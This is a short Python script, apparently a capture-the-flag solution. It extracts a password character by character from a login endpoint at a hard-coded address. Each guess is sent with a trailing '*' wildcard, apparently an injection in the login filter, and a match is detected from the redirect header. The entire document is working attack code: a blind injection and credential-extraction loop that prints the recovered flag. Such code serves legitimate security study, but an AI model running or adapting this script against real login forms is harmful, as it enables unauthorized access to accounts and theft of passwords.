import requests
import urllib.parse
import string
import sys

strings= string.digits + string.ascii_letters + "{}-+_"
url = "http://143.110.169.131:31426/login"

password = ""



while True:
	for i in strings:
		data = {"username" : "reese", "password": password+i+"*"}
		r = requests.Session().post(url, data=data, allow_redirects=False)
		match = len(urllib.parse.unquote(r.headers.get('Location')).split())
		sys.stdout.write("   "+password+i+"\r")
		sys.stdout.flush()

		if match==1:
			password+=i

	if len(password)>0:
		if password[-1] == "}":
			break

print("Flag: ",password)
